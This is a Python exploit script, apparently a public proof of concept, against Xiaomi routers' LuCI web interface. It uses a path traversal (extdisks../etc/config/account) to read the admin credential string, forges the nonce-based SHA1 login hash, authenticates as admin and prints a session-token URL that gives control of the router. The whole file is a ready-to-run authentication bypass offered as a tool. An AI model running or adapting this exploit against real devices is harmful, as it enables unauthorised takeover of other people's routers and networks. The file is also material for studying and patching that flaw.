# -*- coding: utf-8 -*-
import re
import time
import random
import hashlib
import argparse
import requests
from Crypto.Cipher import AES
from pyfiglet import Figlet
from rich.console import Console

console = Console()
console.print(Figlet(font='slant').renderText('Mi-RouTer EXP'), style='bold blue')
console.print('         Author: Summ1e233    \n', style='bold blue')
try:
    parser = argparse.ArgumentParser()        
    parser.add_argument('-u', '--url', dest='url', help='Target Url')
    args = parser.parse_args()
    if args.url:
        if "http://" in args.url or "https://" in args.url:
            host=args.url
            proxies = {}
            try:
                def get_mac():
                    res = requests.get(host+"/cgi-bin/luci/web", proxies=proxies,timeout=3)
                    mac = re.findall(r'deviceId = \'(.*?)\'', res.text)[0]   
                    return mac

                def get_account_str():
                    res = requests.get(host+"/api-third-party/download/extdisks../etc/config/account", proxies=proxies,timeout=3)
                    account_str = re.findall(r'admin\'? \'(.*)\'', res.text)[0]
                    return account_str

                def create_nonce(mac):
                    type_ = 0
                    deviceId = mac
                    time_ = int(time.time())
                    rand = random.randint(0,10000)
                    return "%d_%s_%d_%d"%(type_, deviceId, time_, rand)

                def calc_password(nonce, account_str):
                    m = hashlib.sha1()
                    m.update((nonce + account_str).encode('utf-8'))
                    return m.hexdigest()

                mac = get_mac()
                account_str = get_account_str()
                nonce = create_nonce(mac)
                password = calc_password(nonce, account_str)
                data = "username=admin&password="+password+"&logtype=2&nonce="+nonce
                res = requests.post(host+"/cgi-bin/luci/api/xqsystem/login", 
                    data = data, 
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
                    proxies=proxies,timeout=3)
                stok = re.findall(r'"token":"(.*?)"',res.text)[0]
                console.print("请访问IP[---->]\n   "+host+"/cgi-bin/luci/;stok="+stok+"/web/home#router", style='bold blue')
            except:
                print("[-X-]失败！1.网络不通。2.不存在漏洞[-X-]")


        else:
            console.print('缺少HTTP头,例如：http://127.0.0.1')
    else:
        console.print('缺少URL目标, 请使用 [-u URL]')
except KeyboardInterrupt:
    console.console.print('\nCTRL+C 退出', style='bold blue')
